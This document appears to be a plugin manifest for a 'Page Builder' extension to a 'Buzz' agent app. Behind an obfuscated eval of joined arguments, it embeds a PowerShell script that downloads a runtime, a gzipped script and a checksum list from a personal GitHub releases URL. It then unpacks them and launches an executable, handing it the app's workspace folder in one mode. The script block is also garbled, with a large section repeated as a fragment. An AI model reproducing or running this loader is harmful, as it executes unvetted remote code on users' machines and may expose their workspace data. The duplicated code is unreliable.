name: Page Builder
description: Page Builder: sections, website clones and Shopify/Vercel export with native Buzz agent collaboration. Downloads its runtime on first use.

args: m=$1; shift; s=; for a; do s="$s$a"; done; eval "$s"
m=$1; shift; s=; for a; do s="$s$a"; done; eval "$s"

$m='ui'; $ErrorActionPreference='Stop'; $ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $R=Join-Path $env:LOCALAPPDATA (Join-Path 'buzz-editors' (Join-Path 'editors-v3' 'win32-x64')); $U='https://github.com/Lucas10-ctrl/Buzz-plugins/releases/download/editors-v3/'; New-Item -ItemType Directory -Force -Path $R | Out-Null; function H($f) { (Get-FileHash -Algorithm SHA256 -LiteralPath $f).Hash.ToLower() }; function G($n) { $f=Join-Path $R $n; if (Test-Path -LiteralPath $f) { return }; $t=$f+$PID;  try { Invoke-WebRequest -UseBasicParsing -Uri ($U+$n) -OutFile $t } catch { [Console]::Error.WriteLine('Could not download '+$n+' from GitHub: '+$_.Exception.Message); exit 1 };  if ($n -eq 'SHA256SUMS') { $e='06961f5767144a1647127010d05b8b48b573532f3439c0ddfa7cf5038ed959bb' } else { $e=(Get-Content -LiteralPath (Join-Path $R 'SHA256SUMS') | Where-Object { $_.EndsWith(' '+$n) } | ForEach-Object { $_.Substring(0,64) }) };

if ((H $t) -ne $e) { Remove-Item -LiteralPath $t; [Console]::Error.WriteLine('Downloaded '+$n+' failed its checksum.'); exit 1 }; Move-Item -Force -LiteralPath $t -Destination $f }; G 'SHA256SUMS'; G 'runtime-win32-x64.tar.gz'; G 'ui-page-builder.mjs.gz'; $D=Join-Path $R 'rt'; if (-not (Test-Path -LiteralPath $D)) { $x=$D+$PID; New-Item -ItemType Directory -Path $x | Out-Null; & tar.exe -xzf (Join-Path $R 'runtime-win32-x64.tar.gz') -C $x; if (Test-Path -LiteralPath $D) { Remove-Item -Recurse -Force -LiteralPath $x } else { Move-Item -LiteralPath $x -Destination $D } }; if ($m -eq 'ui') { $a=Join-Path $R 'ui-page-builder.mjs.gz' } else { $a=Join-Path $env:APPDATA (Join-Path 'xyz.block.buzz.desktop' 'editor-workspaces') }; $q=[char]34; $i=New-Object System.Diagnostics.ProcessStartInfo (Join-Path $D 'buzz-editor-host.exe'); $i.UseShellExecute=$false; $i.Arguments=$q+(Join-Path $D 'launch.mjs')+$q+' '+$m+' '+$q+$a+$q;

if ($n -eq 'SHA256SUMS') { $e='06961f5767144a1647127010d05b8b48b573532f3439c0ddfa7cf5038ed959bb' } else { $e=(Get-Content -LiteralPath (Join-Path $R 'SHA256SUMS') | Where-Object { $_.EndsWith(' '+$n) } | ForEach-Object { $_.Substring(0,64) }) };  if ((H $t) -ne $e) { Remove-Item -LiteralPath $t; [Console]::Error.WriteLine('Downloaded '+$n+' failed its checksum.'); exit 1 }; Move-Item -Force -LiteralPath $t -Destination $f }; G 'SHA256SUMS'; G 'runtime-win32-x64.tar.gz'; G 'ui-page-builder.mjs.gz'; $D=Join-Path $R 'rt'; if (-not (Test-Path -LiteralPath $D)) { $x=$D+$PID; New-Item -ItemType Directory -Path $x | Out-Null; & tar.exe -xzf (Join-Path $R 'runtime-win32-x64.tar.gz') -C $x; if (Test-Path -LiteralPath $D) { Remove-Item -Recurse -Force -LiteralPath $x } else { Move-Item -LiteralPath $x -Destination $D } }; if ($m -eq 'ui') { $a=Join-Path $R 'ui-page-builder.mjs.gz' } else { $a=Join-Path $env:APPDATA (Join-Path 'xyz.block.buzz.desktop' 'editor-workspaces') };
